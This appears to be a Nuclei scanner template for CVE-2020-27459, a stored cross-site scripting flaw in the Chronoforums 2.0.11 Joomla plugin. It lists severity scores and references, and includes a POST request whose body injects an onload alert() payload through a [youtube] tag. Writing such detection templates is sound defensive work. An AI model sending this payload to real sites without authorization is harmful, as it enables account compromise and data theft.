id: CVE-2020-27459

info:
  name: Stored XSS Vulnerability in Chronoforum v2.0.11
  author: ProjectDiscoveryAI
  severity: medium
  description: Chronoforeum 2.0.11 allows Stored XSS vulnerabilities when inserting a crafted payload into a post. If any user sees the post, the inserted XSS code is executed.
  impact: |
    Successful exploitation could lead to unauthorized access, data theft, and potential compromise of user accounts.
  remediation: |
    Apply the latest patch or upgrade to a secure version of Chronoforum to mitigate the vulnerability.
  reference:
    - https://github.com/nugmubs/chronoforums-cve/wiki/Stored-XSS-Vulnerability-in-Chronoforum-v2.0.11-(Joomla-plugin)
    - https://github.com/nugmubs/chronoforums-cve/wiki/Stored-XSS-Vulnerability-in-Chronoforum-v2.0.11-%28Joomla-plugin%29
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-27459
    cwe-id: CWE-79
    epss-score: 0.00078
    epss-percentile: 0.35399
    cpe: cpe:2.3:a:chronoengine:chronoforums:2.0.11:*:*:*:*:joomla:*:*
  metadata:
    vendor: chronoengine
    product: chronoforums
    framework: joomla

http:
  - method: POST
    path:
      - "{{BaseURL}}/components/com_chronoforums2/chronoforums/controllers/topics.php"

    body: |
      title=Test&content=[youtube]http://example.com" onload="alert('XSS Proofed')" http://example.com[/youtube]

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "alert('XSS Proofed')"
        part: body
